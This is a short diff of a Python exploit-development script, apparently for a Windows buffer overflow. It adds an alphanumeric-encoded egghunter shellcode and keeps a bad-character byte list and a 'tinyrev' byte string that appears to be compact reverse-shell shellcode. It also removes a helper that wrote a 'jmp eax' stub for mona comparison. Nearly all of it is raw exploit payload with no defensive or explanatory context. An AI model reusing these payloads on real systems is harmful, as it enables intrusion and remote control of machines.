@@ -16,10 +16,17 @@ badchars = (
     b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
     b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
+egghunter = (
+    b"%JMNU%521*TX-1MUU-1KUU-5QUUP\AA%J"
+    b"MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5"
+    b"21*-q!au-q!au-oGSePAA%JMNU%521*-D"
+    b"A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1"
+    b"z1E-oRHEPAA%JMNU%521*-3s1--331--^"
+    b"TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA"
+    b"A%JMNU%521*-R222-1111-nZJ2PAA%JMN"
+    b"U%521*-1-wD-1-wD-8$GwP")
 
 tinyrev = b"\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x30\x97\x4e\x75\x31\xc0\xff\xd3\x96\x68"
 
-with open("encodeme.bin", "wb") as f: #To be used with !mona compare
-          f.write(asm("jmp eax;"))
 
-
+print(len(egghunter))
